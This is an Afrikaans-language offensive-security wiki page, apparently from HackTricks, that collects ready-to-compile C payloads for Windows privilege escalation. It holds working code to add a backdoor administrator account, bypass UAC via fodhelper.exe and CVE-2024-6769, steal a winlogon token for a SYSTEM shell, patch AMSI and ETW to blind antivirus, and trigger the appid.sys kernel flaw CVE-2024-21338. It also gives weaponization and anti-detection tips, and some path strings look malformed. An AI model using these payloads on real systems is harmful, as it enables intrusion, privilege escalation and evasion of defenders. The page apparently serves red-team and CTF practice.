# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy versamel **klein, selfstandige C-snippets** wat nuttig is tydens Windows Local Privilege Escalation of post-exploitation. Elke payload is ontwerp om **maklik te copy-paste**, vereis slegs die Windows API / C-runtime, en kan met `i686-w64-mingw32-gcc` (x86) of `x86_64-w64-mingw32-gcc` (x64) gecompileer word.

> ⚠️ Hierdie payloads neem aan dat die proses reeds die minimum privileges het wat nodig is om die aksie uit te voer (bv. `SeDebugPrivilege`, `SeImpersonatePrivilege`, of ’n medium-integrity context vir ’n UAC bypass). Hulle is bedoel vir **red-team- of CTF-settings** waar die exploitation van ’n vulnerability arbitrêre native code execution tot gevolg gehad het.

---

## Voeg ’n local administrator user by
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Wanneer die trusted binary **`fodhelper.exe`** uitgevoer word, bevraagteken dit die registerpad hieronder **sonder om die `DelegateExecute`-verb te filter**. Deur ons command onder daardie sleutel te plaas, kan ’n aanvaller UAC *bypass* **sonder om ’n file na die skyf te skryf**.<sup>[[1]](#references)</sup>

*Registerpad wat deur `fodhelper.exe` bevraagteken word*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
'n Minimale PoC wat 'n elevated `cmd.exe` laat verskyn:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Getoets op Windows 10 22H2 en Windows 11 23H2 (Julie 2025-patches). Die bypass werk steeds omdat Microsoft nie die ontbrekende integriteitskontrole in die `DelegateExecute`-pad reggestel het nie.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive-remapping + activation context cache poisoning werk steeds teen patched Windows 10/11-builds omdat `ctfmon.exe` as ’n hoë-integriteit trusted UI-process loop wat graag vanaf die caller se geëmuleerde `C:`-drive laai en enige DLL-redirections hergebruik wat `CSRSS` gecache het. Die misbruik werk soos volg: wys `C:` weer na attacker-controlled storage, plaas ’n trojanized `msctf.dll`, launch `ctfmon.exe` om hoë integriteit te verkry, en vra dan vir `CSRSS` om ’n manifest te cache wat ’n DLL herlei wat deur ’n auto-elevated binary gebruik word (byvoorbeeld `fodhelper.exe`), sodat die volgende launch jou payload sonder ’n UAC-prompt erf.<sup>[[5]](#references)</sup>

Praktiese workflow:
1. Prepareer ’n fake `%SystemRoot%\System32`-tree en copy die legitimate binary wat jy beplan om te hijack (dikwels `ctfmon.exe`).
2. Gebruik `DefineDosDevice(DDD_RAW_TARGET_PATH)` om `C:` binne jou process te remap, terwyl jy `DDD_NO_BROADCAST_SYSTEM` behou sodat die verandering local bly.
3. Plaas jou DLL + manifest in die fake tree, call `CreateActCtx/ActivateActCtx` om die manifest in die activation-context cache te push, en launch dan die auto-elevated binary sodat dit die redirected DLL direk in jou shellcode resolve.
4. Delete die cache entry (`sxstrace ClearCache`) of reboot wanneer jy klaar is om attacker fingerprints uit te vee.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Cleanup-wenk: nadat jy SYSTEM verkry het, roep `sxstrace Trace -logfile %TEMP%\sxstrace.etl` gevolg deur `sxstrace Parse` wanneer jy toets—indien jy jou manifest-naam in die log sien, kan defenders dit ook sien, so roteer paaie met elke uitvoering.

---

## Begin SYSTEM-shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Indien die huidige proses **beide** `SeDebug`- en `SeImpersonate`-privileges het (tipies vir baie service accounts), kan jy die token van `winlogon.exe` steel, dit dupliseer en ’n elevated process begin:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Vir ’n dieper verduideliking van hoe dit werk, sien:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Die meeste moderne AV/EDR-enjins maak staat op **AMSI** en **ETW** om kwaadwillige gedrag te inspekteer. Deur albei koppelvlakke vroeg binne die huidige proses te patch, word voorkom dat script-gebaseerde payloads (bv. PowerShell, JScript) geskandeer word.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Die patch hierbo is process-local; om ’n nuwe PowerShell te spawn nadat dit uitgevoer is, sal sonder AMSI/ETW-inspeksie uitgevoer word.*

---

## Skep child as Protected Process Light (PPL)
Versoek ’n PPL-beskermingsvlak vir ’n child tydens skepping deur `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` te gebruik. Dit is ’n gedokumenteerde API en sal slegs slaag indien die target image onderteken is vir die aangevraagde signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Mees algemeen gebruikte vlakke:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Valideer die resultaat met Process Explorer/Process Hacker deur die Protection-kolom na te gaan.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` stel ’n device object (`\\.\\AppID`) bloot waarvan die smart-hash-onderhouds-IOCTL funksiewysers wat deur die gebruiker verskaf is, aanvaar wanneer die caller as `LOCAL SERVICE` loop; Lazarus misbruik dit om PPL te deaktiveer en arbitrêre drivers te laai, dus behoort red teams ’n klaargemaakte trigger vir lab-gebruik te hê.<sup>[[6]](#references)</sup>

Operasionele notas:
- Jy benodig steeds ’n `LOCAL SERVICE`-token. Steel dit van `Schedule` of `WdiServiceHost` met `SeImpersonatePrivilege`, en impersonateer voordat jy aan die device raak sodat ACL-kontroles slaag.
- IOCTL `0x22A018` verwag ’n struct wat twee callback pointers bevat (query length + read function). Wys albei na user-mode stubs wat ’n token overwrite uitvoer of ring-0 primitives map, maar hou die buffers RWX sodat KernelPatchGuard nie in die middel van die chain crash nie.
- Na sukses, beëindig die impersonation en revert die device handle; defenders let nou op na onverwagte `Device\\AppID`-handles, dus moet jy dit onmiddellik sluit sodra privilege verkry is.

<details>
<summary>C - Skeleton trigger for `appid.sys` smart-hash abuse</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimale regstelling vir ’n weaponized build: karteer ’n RWX section met `VirtualAlloc`, kopieer jou token duplication stub daarheen, stel `KernelThunk = section`, en sodra `DeviceIoControl` terugkeer, behoort jy SYSTEM te wees, selfs onder PPL.

---

## Verwysings

- [1] [First entry: Welcome and fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimal PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
